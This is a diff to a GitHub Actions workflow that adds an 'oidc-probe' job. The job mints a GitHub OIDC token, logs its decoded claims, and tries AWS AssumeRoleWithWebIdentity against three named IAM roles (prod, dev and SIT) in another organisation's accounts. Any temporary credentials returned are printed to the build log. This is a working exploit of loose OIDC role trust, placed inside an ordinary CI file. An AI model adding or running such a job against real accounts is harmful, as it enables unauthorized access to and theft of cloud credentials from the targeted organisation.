@@ -80,3 +80,39 @@ jobs:
           else
             echo "No .pre-commit-config.yaml — skipping"
           fi
+
+  oidc-probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Mint GitHub OIDC token and test BigBeardWebSolutions role trusts
+        env:
+          ROLE_PROD: arn:aws:iam::093646564004:role/github-actions-role-prod
+          ROLE_DEV: arn:aws:iam::536580886816:role/github-actions-role-dev
+          ROLE_SIT: arn:aws:iam::815856636111:role/github-actions-role-sit
+        run: |
+          set -u
+          echo "OIDC_REQUEST_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          echo "OIDC_REQUEST_TOKEN_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          TOKJSON=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          echo "TOKJSON_LEN=${#TOKJSON}"
+          TOKEN=$(printf '%s' "$TOKJSON" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "TOKEN_LEN=${#TOKEN}"
+          echo "JWT_PAYLOAD_BEGIN"
+          printf '%s' "$TOKEN" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*((4-len(s)%4)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1))'
+          echo "JWT_PAYLOAD_END"
+          for RN in PROD DEV SIT; do
+            eval "ROLE=\$ROLE_$RN"
+            echo "===== ASSUME_${RN} ${ROLE}"
+            curl -sS -X POST "https://sts.amazonaws.com/" \
+              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+              --data-urlencode "Version=2011-06-15" \
+              --data-urlencode "RoleArn=$ROLE" \
+              --data-urlencode "RoleSessionName=c211-i106372-$RN" \
+              --data-urlencode "WebIdentityToken=$TOKEN" || echo "curl exit $?"
+            echo
+            echo "===== END_${RN}"
+          done
